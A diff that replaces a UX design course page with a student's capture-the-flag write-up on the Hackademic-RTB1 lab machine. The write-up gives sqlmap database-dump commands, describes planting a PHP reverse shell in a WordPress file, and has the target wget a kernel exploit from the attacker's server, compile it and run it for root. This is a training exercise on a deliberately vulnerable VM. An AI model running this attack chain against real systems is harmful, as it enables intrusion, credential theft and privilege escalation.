@@ -1,240 +1,122 @@
-# CPT-363 User Interface Design
+# Report for the *Cybersecurity* course - Hackademic-RTB1
+*Alberto Beltrami - IN2000253*
 
-> ## What’s Happening This Week
-> ### How to explore the problem space?
-> #### Important Reminders
-> * [Journey Map](#) assignment <span class='badge'> Tue Jun 12th 11:59pm PDT</span>
-> * [Course Reflection Log](#) assignment <span class='badge'> Fri Aug 3rd 11:59pm PDT</span>
->
-> #### Required Reading
-> * [The Skeptic’s Guide To Low-Fidelity Prototyping](https://www.smashingmagazine.com/2014/10/the-skeptics-guide-to-low-fidelity-prototyping/)
->
-> [Required Reading Quiz due Jun 4th](https://canvas.sfu.ca/courses/44038/quizzes/166553 ':class=button')
+This is a CTF ("Capture The Flag") challenge. The goal is to read (capture) a specific file (the flag) stored in the target machine.
 
----
+First of all, I installed the virtual machine from [here](https://www.vulnhub.com/entry/hackademic-rtb1,17/). This virtual machine will be the target for this activity. All the following steps for this demo have been executed from a Kali Linux virtual machine previously installed.
 
-## Week 1 (May 9 - 15)
+The main steps to complete this activity are:
+- Network Scanning
+- WordPress based SQLMAP Scanning
+- Databases and WordPress user credentials extraction
+- Login into the WordPress admin console with specific user
+- File update and Reverse shell execution
+- Reverse shell connection
+- Exploiting the target
+- Getting root access and flag capture
 
-![UX - User Experience](images/12650723674_d5c85af332_k.jpg ':class=banner-image')
+## Network Scanning
 
-### What is usability and user experience design?
+I had to "discover" the network, searching for any device available in it, in particular I had to find the IP address of the target. So, I used the `netdiscover` command in the terminal. This is a reconnaissance tool to identify live hosts on the network. The following picture shows the output of the `netdiscover` command I obtained.
 
-##### Summaries and Questions | Week 1  
-[May 9th Class One-minute Summaries](https://sso.canvaslms.com/courses/1924881/assignments/14377751)
+![IP addresses found](screenshot_demo/netdiscover_2.png)
 
-##### Presented Slides | Week 1  
-<div class="video-container-16by9"><iframe src="https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/embed?start=false&loop=false&delayms=3000" frameborder="0" width=780" height="585" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe></div>
+At this point I had to obtain some information about the IP addresses I have just obtained. So, I used the `nmap` command with the `-A` option set to obtain as much information as possible. This command executes several scans and scripts to analyse the specified IP address, providing many information about it. In particular, I was interested to know which port numbers were opened on these IP addresses. The following picture shows the output of the command for each IP address I found.
 
-##### Supplemental Materials | Week 1  
-[Elements of User Experience by Jesse James Garrett](https://qofr.files.wordpress.com/2016/11/q-of-r-presentation-11.pdf)
-<div class="responsive-container"><iframe src="https://docs.google.com/viewer?url=https://qofr.files.wordpress.com/2016/11/q-of-r-presentation-11.pdf&embedded=true" style="width:780px; height:585px;" frameborder="0"></iframe></div>
+![`nmap` output](screenshot_demo/nmap.png)
 
-##### Downloads | Week 1
-[Course Overview](https://sso.canvaslms.com/courses/1924881/files/folder/Downloads/Course%20Overview)  
+The 10.0.2.1 IP address is something related to DNS, since it had the 53 port opened (I will not use this device during this activity, in the following steps I just ignored it). I ignored also the 10.0.2.3 IP address, since it seems down. However, I observed there was an 80 port opened on the IP address is 10.0.2.15. This will be the target.  Since the port 80 is assigned to internet communications, I browsed the IP address of the target (http://10.0.2.15). I obtained a web page. Then, I navigate within this web page clicking on the word *"target"* and then on *"uncategorized"*, so I have been redirected to the http://10.0.2.15/Hackademic_RTB1/?cat=1 page. Simply adding a single quote ( ' ) to this URL, I obtained a WordPress database error. The following picture shows the error statement (inside the red box).
 
-##### Recommended Reading | Week 1  
-<a class="embedly-card" data-card-controls="0" data-card-align="left" href="https://www.nngroup.com/articles/usability-101-introduction-to-usability/">Usability 101: Introduction to Usability</a>
+![Vulnerability exposition](screenshot_demo/vulnerability_exposition.png)
 
-![Flowchart](images/4853380320_492f9dce63_b.jpg ':class=banner-image')
+In addition, from these web pages I found some information about the goal of the entire activity, since in the webpage I found the statement: *"Goal: Gain access to the (HackademicRTB1) box and read the “**Key.txt**” file in the root directory"*.
 
----
+## WordPress based SQLMAP Scanning
 
+The error I have just found was a vulnerability exposition of the web application. In particular, at that point I realised this is a WordPress website with a SQL injection vulnerability. So, I executed a specific command in the terminal to test the URL searching for SQL injection vulnerabilities.
 
-## Week 2 (May 16 - 22)
+`sqlmap –u http://10.0.2.15/Hackademic_RTB1/?cat=1 --dbs --batch`
 
-### What does a holistic user experience design process look like?
+This command targets the specified URL automaticaly checking for  SQL injection vulnerabilities. If a vulnerability is found, this command enumerates and lists all the databases available on the targeted system (without asking any user input/interaction). The following picture shows the output of the command I executed.
 
-#### Summaries and Questions | Week 2   
-[May 16th Class One-minute Summaries](https://sso.canvaslms.com/courses/1924881/assignments/14377743)
+![SQL injection vulnerabilities check](screenshot_demo/sql_1.png)
 
-#### Presented Slides | Week 2   
-<div class="video-container-16by9"><iframe src="https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/embed?start=false&loop=false&delayms=3000" frameborder="0" width=780" height="585" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe></div>
+## Databases and WordPress user credentials extraction
 
-#### CPT-363 UX Design Process/Toolkit | Week 2
-![UX Design Process/Toolkit](images/ux-toolkit-8-no-numbers.png)
+After noticing a WordPress database was available on the web application, I executed another command from the terminal to extract users information from the WordPress database.
 
-#### Downloads | Week 2
-[Product Reaction Cards](https://sso.canvaslms.com/courses/1924881/files/folder/Downloads/Product%20Reaction%20Cards)  
+`sqlmap –u http://10.0.2.15/Hackademic_RTB1/?cat=1 -D wordpress --dump-all --batch`
 
-#### Assignments | Week 2
-[Course Reflection Log](https://sso.canvaslms.com/courses/1413912/assignments/9519528)  
+This command is the SQL injection attack on the targeted web application. It extracts all the tables and entries of the WordPress database available on the web application automatically answering to all the promts (again, no user interactions are required). In addition, this command automatically performs the password cracking of the users’ passwords.
 
-#### Quick Quiz | Week 2
-<iframe src="https://h5p.org/h5p/embed/214115" width="728" height="278" frameborder="0" allowfullscreen="allowfullscreen" allow="geolocation *; microphone *; camera *; midi *; encrypted-media *" title="User-Centered Design"></iframe><script src="https://h5p.org/sites/all/modules/h5p/library/js/h5p-resizer.js" charset="UTF-8"></script>
+The following picture shows the output of the command (actually this is only a portion of the entire output I obtained). In particular, there are all the username registered on the web application with their corresponding password and password hash.
 
-#### Recommended Reading  
-<a class="embedly-card" data-card-controls="0" data-card-align="left" href="https://uxplanet.org/the-evolution-of-ux-process-methodology-47f52557178b">The Evolution of UX Process Methodology</a>
+![SQL attack injection and automatic password cracking](screenshot_demo/sql_2.png)
 
----
+This means I have obtained valid credentials for the web application.
 
+## Login into the WordPress admin console with specific user
 
-## Week 3 (May 23 - 29)
+I browsed the WordPress login page (http://10.0.2.15/Hackademic_RTB1/wp-login.php).
 
-![Bullseye](images/6384294717_5047a35d48_b.jpg ':class=banner-image')
+Logging in with users credentials found with the previously command, I noticed the user *"GeorgeMiller"* has much more available options than other users. In particular, this user had the privileges to add and modify files. So, I decided to proceed the activity on the web application using this identity.
 
-### How to make more strategic design decisions?
+Clicking the *"Manage"* botton and then on the *"Files"* botton, I found a file named `hello.php`.
 
-#### Summaries and Questions | Week 3  
-[May 23rd Class One-minute Summaries](https://sso.canvaslms.com/courses/1924881/assignments/14377744)
+## `hello.php` file update and Reverse shell execution
 
-#### Presented Slides | Week 3  
-<div class="video-container-16by9"><iframe src="https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/embed?start=false&loop=false&delayms=3000" frameborder="0" width=780" height="585" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe></div>
+The idea was to modify the `hello.php` file to connect from Kali to the target. So, I opened through the terminal (in Kali) the `/usr/share/webshells/php` directory  to find a file called `php-reverse-shell.php`. This file (stored in Kali) is a sort of script to establish a reverse shell connection, so I will use it in the next steps to be able to connect and communicate with the targeted system from Kali. In particular, (after some steps I will illustrate in the following paragraphs) at a certain point I will be able to execute commands in the targeted system from remote (from Kali).
 
-#### Supplemental Materials | Week 3  
-<div class="video-container-4by3"><iframe width="780" height="585" src="https://www.youtube.com/embed/mSxpVRo3BLg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
+I copied the content of the `php-reverse-shell.php` file and pasted it in the `hello.php` file. At that point, I had to change a certain parameter of the `hello.php` file to specify the IP address of the machine I wanted to connect from (the Kali machine) in the reverse shell. So, I obtained the IP address of the Kali machine through an `ifconfig` command, and I inserted it in the `hello.php` file.
 
-#### Assignments | Week 3
-[Journey Map](https://sso.canvaslms.com/courses/1924881/assignments/14377756)  
+![IP address of Kali inserted in the `hello.php` file](screenshot_demo/IP_kali.png)
 
-#### Required Reading | Week 3  
-<a class="embedly-card" data-card-controls="0" data-card-align="left" href="https://www.aytech.ca/blog/user-journey-map/">What is a User Journey Map?</a>
+These were very important steps to establish a reverse shell connection to be able to communicate and execute remote commands on the target from Kali.
 
----
+## Reverse shell connection
 
-## Week 4 (May 30 - Jun 5)
+I ran (on the Kali terminal) the Netcat listener with the `nc -lvp 1234` command. This command "listen" from an incoming connection on the 1234 port. This port number was written in the `php-reverse-shell.php` file (so, at that point it was written in the `hello.php` file, too).
 
-![Wireframe](images/6968244538_4c0f7c7e64_k.jpg ':class=banner-image')
+To start the connection, I browsed http://10.0.2.15/Hackademic_RTB1/wp-content/plugins/hello.php. This means I was accessing the `hello.php` file I have modified in the previously steps, and executing the script (written in the `hello.php` file) to activate a remote shell connection between Kali and the target. After that I was able to execute command within the target machine from Kali.
 
-### How to explore the problem space?
+## Exploiting the target
 
-#### Summaries and Questions | Week 4  
-[May 30th Class One-minute Summaries](https://sso.canvaslms.com/courses/1924881/assignments/14377745)
-
-#### Presented Slides | Week 4    
-<div class="video-container-16by9"><iframe src="https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/embed?start=false&loop=false&delayms=3000" frameborder="0" width=780" height="585" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe></div>
-
-#### Supplemental Materials | Week 4    
-<div class="video-container-4by3"><iframe width="780" height="585" src="https://www.youtube.com/embed/MwidSAlbEB8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
-
-#### Downloads | Week 4  
-[4-UP BROWSERS + GRID](https://sso.canvaslms.com/courses/1924881/files/folder/Downloads/Sketching%20Templates/sneakpeekit-4-browsers)  
-[4-UP MOBILES + GRID](https://sso.canvaslms.com/courses/1924881/files/folder/Downloads/Sketching%20Templates/sneakpeekit-4-mobiles)  
-
-#### Required Reading | Week 4    
-<a class="embedly-card" data-card-controls="0" data-card-align="left" href="https://www.smashingmagazine.com/2014/10/the-skeptics-guide-to-low-fidelity-prototyping/">The Skeptic’s Guide To Low-Fidelity Prototyping</a>
-
----
-
-## Schedule
-
-### :fas fa-calendar fa-fw: Week 1 (May 9 - 15)
-**What is usability and user experience design?**  
-:fas fa-desktop fa-fw: [Introduction to UX Design](https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/pub?start=false&loop=false&delayms=3000)   
-:fas fa-book fa-fw: [Usability 101: Introduction to Usability](https://www.nngroup.com/articles/usability-101-introduction-to-usability/)  
-
-### :fas fa-calendar fa-fw: Week 2 (May 16 - 22)
-**What does a holistic user experience design process look like?**  
-:fas fa-keyboard fa-fw: [Course Reflection Log](https://sso.canvaslms.com/courses/1924881/assignments/14377752) <span class='badge'> Fri Aug 3rd 11:59pm PDT</span>  
-:fas fa-desktop fa-fw: [The Process of UX Design](https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/pub?start=false&loop=false&delayms=3000)   
-:fas fa-book fa-fw: [The Evolution of UX Process Methodology](https://uxplanet.org/the-evolution-of-ux-process-methodology-47f52557178b)  
-
-### :fas fa-calendar fa-fw: Week 3 (May 23 - 29)
-**How to make more strategic design decisions?**  
-:fas fa-keyboard fa-fw: [Journey Map](https://sso.canvaslms.com/courses/1924881/assignments/14377756) <span class='badge'> Tue Jun 12th 11:59pm PDT</span>  
-:fas fa-folder fa-fw: [Informed Consent Materials](https://sso.canvaslms.com/courses/1924881/files/folder/Downloads/Informed%20Consent)  
-:fas fa-desktop fa-fw: [Strategic UX Design](https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/pub?start=false&loop=false&delayms=3000)   
-:fas fa-book fa-fw: [What is a User Journey Map?](https://www.aytech.ca/blog/user-journey-map/)  
-
-### :fas fa-calendar fa-fw: Week 4 (May 30 - Jun 5)
-**How to explore the problem space?**  
-:fas fa-desktop fa-fw: [Prototyping](https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/pub?start=false&loop=false&delayms=3000)   
-:fas fa-book fa-fw: [The Skeptic’s Guide To Low-Fidelity Prototyping](https://www.smashingmagazine.com/2014/10/the-skeptics-guide-to-low-fidelity-prototyping/)  
-:fas fa-users fa-fw: In-class office hours (tentative)  
-
-### :fas fa-calendar fa-fw: Week 5 (Jun 6 - 12)
-**How to plan, conduct, and summarize usability tests?**  
-:fas fa-desktop fa-fw: [Usability Testing](https://docs.google.com/presentation/d/e/2PACX-1vRnnRFelgw1ksq_p8Eryg3dnyLCRRLPf5fBgdwdv9p-tCIwcxqWvzDGrGbjxGHL7HqEJVpmV26ntk3a/pub?start=false&loop=false&delayms=3000)   
-:fas fa-book fa-fw: [The Art of Guerrilla Usability Testing](http://www.uxbooth.com/articles/the-art-of-guerrilla-usability-testing/)  
-:fas fa-users fa-fw: In-class office hours (tentative)
-
----
-
-## Resources
-
-### Reflective Writing  
-*   [A short guide to reflective writing](https://intranet.birmingham.ac.uk/as/libraryservices/library/skills/asc/documents/public/Short-Guide-Reflective-Writing.pdf)
-*   [How Reflecting On Your Work Can Make You A Better Designer](https://medium.com/center-centre-cohort-01/how-reflecting-on-your-work-can-make-you-a-better-designer-5ce2f3886f51)
-*   [Online Guide to Reflective Writing](https://nile.northampton.ac.uk/bbcswebdav/pid-1244383-dt-content-rid-3278540_1/courses/Centre-for-Achievement-and-Performance/Skills/Reflective%20Writing/Reflective%20Writing%20-%20Feb%202017.pdf)
-*   [Reflective Toolbox](http://writeonline.ca/media/documents/ReflectiveToolbox.pdf)
-*   [Reflective writing: a basic introduction](http://www.port.ac.uk/media/contacts-and-departments/student-support-services/ask/downloads/Reflective-writing---a-basic-introduction.pdf)
-
-### UX Platform Guideline Collections  
-*   [Android User Interface Design Guidelines](https://developer.android.com/guide/practices/ui_guidelines/index.html)
-*   [Google Material Design Guidelines](https://material.google.com/)
-*   [iOS Human Interface Design Guidelines (iPhone and iPad)](https://developer.apple.com/ios/human-interface-guidelines/)
-*   [KDE Human Interface Design Guidelines](https://community.kde.org/KDE_Visual_Design_Group/HIG)
-*   [OS X Human Interface Design Guidelines](https://developer.apple.com/library/mac/documentation/UserExperience/Conceptual/OSXHIGuidelines/index.html#//apple_ref/doc/uid/TP40002720-TPXREF101)
-*   [Windows App Design Guidelines (Touch)](https://msdn.microsoft.com/en-us/library/dn742468.aspx)
-
-### UX Templates  
-*   [Contextual Interview Form](http://userfocus.co.uk/pdf/cisheet.pdf)  
-*   [One Page User Research Plan](https://www.smashingmagazine.com/2012/01/ux-research-plan-stakeholders-love/)  
-*   [Templates & Downloadable Documents | Usability.gov](http://www.usability.gov/how-to-and-tools/resources/templates.html)
-*   [cxpartners | Resources](http://www.cxpartners.co.uk/ux-resources/)
-*   [The PM Toolkit](http://thepmtoolkit.com/)
-*   [UX Project Checklist](http://uxchecklist.github.io/)
-
-### UX Design Checklists  
-*   [A Checklist for Designing Mobile Input Fields](http://www.nngroup.com/articles/mobile-input-checklist/)  
-*   [Mobile UX Checklist (PDF, by Mobify)](http://downloads.mobify.com.s3.amazonaws.com/ebooks/25-Ways-to-Make-Your-Mobile-E-Commerce-Revenue-Skyrocket-Mobify.pdf)  
-*   [One-Page Touch Interaction Design Checklist (PDF)](https://canvas.sfu.ca/courses/38847/files/folder/Handouts/Touch%20Interaction%20Checklist)
-*   [Usability checklist (Userium)](https://userium.com/)
-*   [UX Project Checklist](http://uxchecklist.github.io/)
-
-### UX Technique Collections  
-*   [Methods | Usability.gov](http://www.usability.gov/how-to-and-tools/methods/)
-*   [Methods | Usability Body of Knowledge](http://www.usabilitybok.org/methods)
-*   [Usability Planner](http://usabilityplanner.org/#home)
-*   [UX Techniques (by UX Mastery)](http://uxmastery.com/resources/techniques)
-
-### UX Article Collections  
-*   [The UX Bookmark](http://www.theuxbookmark.com/)
-*   [User Experience Magazine (UXPA)](http://uxpamagazine.org/)
-*   [UI/UX Articles (Medium)](https://medium.com/ui-ux-articles)
-
-### UX eBooks  
-*   [50 UX Best Practices by Above the Fold (email address required)](http://www.userexperiencedesigns.com/)
-*   [Bright Ideas for User Experience Designers](http://www.userfocus.co.uk/ebooks/uxdesign.html)
-*   [The Fable of the User-Centered Designer](http://www.userfocus.co.uk/fable/)
-
-### UX Design MOOCs & Courses
-*   [Human-Computer Interaction | Coursera](https://www.coursera.org/course/hciucsd)
-*   [The Design of Everyday Things | Udacity](https://www.udacity.com/course/design101)
-*   [Rapid Wireframing: Finding the Right Product Design](https://www.skillshare.com/classes/design/Rapid-Wireframing-Finding-the-Right-Product-Design/1947996659)
-
-### UX Podcast Collections  
-*   [Design Critique: Products for People](http://designcritique.net/)
-*   [Podcasts - UIE Brain Sparks](http://www.uie.com/brainsparks/topics/podcasts/)
-*   [Boagworld Podcast](https://boagworld.com/show/)
-*   [User Experience Podcast](http://www.infodesign.com.au/uxpod)
-
-### UX Video Collections  
-*   [Google Developers Channel](https://www.youtube.com/user/GoogleDevelopers/search?query=user+experience+usability)  
-*   [Interaction Design Association Vimeo Channels](http://vimeo.com/ixdaglobal/channels)  
-*   [NNgroup YouTube Channel](https://www.youtube.com/user/NNgroup/videos)  
-*   [UX Mastery YouTube Channel](https://www.youtube.com/channel/UCXmQyv8sAjmvgCCgvRKi9hw)
-
----
-
-## LMS Links
-
-[Calendar](https://canvas.sfu.ca/courses/44038/calendar)  
-[Assignments](https://canvas.sfu.ca/courses/44038/assignments )  
-[Quizzes](https://canvas.sfu.ca/courses/44038/quizzes)  
-[Class Discussions](https://canvas.sfu.ca/courses/44038/discussion_topics)  
-[Syllabus](https://canvas.sfu.ca/courses/44038/assignments/syllabus)  
-
----
-
-## Contact
-
-### Course Instructor  
-Some Name  
-somename@somewhere.edu  
-
-Online office hours:  
-Mondays 12:00-1:30pm  
-Fridays 12:00-1:00pm  
-
-Suggestion, concern or complaint?  
-Send me your [anonymous course feedback](#)!
+The exploit can be downloaded from [here](https://www.exploit-db.com/exploits/15285). However, it's already available in Kali, so I searched for it through the terminal with the command `searchsploit 15285`. This command searches for the specified exploit in some database available in Kali and it output some information such as title and location of the exploit.
+
+I copied the exploit file in the current directory with the command `cp /usr/share/exploitdb/exploits/linux/local/15285.c .`. Then, I ran the default Python HTTP server on port 80 on Kali with the command: `python2 -m SimpleHTTPServer 80`. I will use this server in the following steps to to download on the target the exploit from Kali.
+
+Basically, at that point I had to:
+
+1. download the exploit on the target machine;
+2. execute the exploit on the target machine.
+
+I have executed the following commands from remote on the target machine through the reverse shell connection established in the previously step.
+
+- `cd /tmp`: command to navigate within the target machine in the `/tmp` directory. This directory is usually used to store and manage configuration files, temporary files and other system files.
+- `wget http://10.0.2.4/15285.c`: HTTP request to download the exploit from the HTTP server on Kali (this is possible because I have previosly opened an HTTP server on Kali with the command `python2 -m SimpleHTTPServer 80`). Please note that the IP address in the specified URL in the command is the IP address of Kali (I was downloading the exploit on the target, so I had to contact the Kali machine for this).
+
+- `ls`: command to see all the file in the current directory (`/tmp`).
+- `gcc 15285.c -o kernel`: command to compile the exploit and save the output of the compilation in a file named `kernel` in the current directory.
+
+## Getting root access and flag capture
+
+I have executed the following commands from remote on the target machine (again, through the remote shell connection) to get root access and to read the `key.txt` file (get the flag).
+
+- `chmod 777 kernel`: command to change permissions of the `kernel` file. After this command, all users are able to read, write and execute it.
+
+- `./kernel`: command to run the `kernel` file previously created (this command have been granted only because of the permissions changes for this file in the previous command).
+
+- `cd /root`: command to access the `root` directory of the target. This directory is the top-level directory in every Unix file system hierarchy, and it contains all other directories and files on the system. This directory is typically accessible only to the root user or users with administrative privileges. I was able to access it because of the exploit I have executed on the target.
+ 
+- `ls`: command to see all the file in the current directory (`root`). From the output of this command I observed the `root` directory of the target contained the `Desktop` directory, the `anaconda-ks.cfg` file (configuration file of Linux systems) and the `key.txt` file (the file I was looking for).
+- `cat key.txt`: command to show the content of the specified file in the terminal.
+
+So, I managed to find and get the flag: the content of the `key.txt` file. The following pictures show the terminal I used for the creation of reverse shell connection between Kali and the target, the exploit download on the target, the commands to reach the `root` directory and finally the command to see the content of the `key.txt` file. 
+
+![](screenshot_demo/last_commands_1.png)
+
+![](screenshot_demo/last_commands_2.png)
+
+## Sources
+
+This demo is related to a walkthrough found on the web. The walkthrough of the entire activity can be found [here](https://www.hackingarticles.in/hack-the-hackademic-rtb1-vm-boot-to-root/). However, some information (for example, about commands) have been obtained using ChatGPT (v3.5).
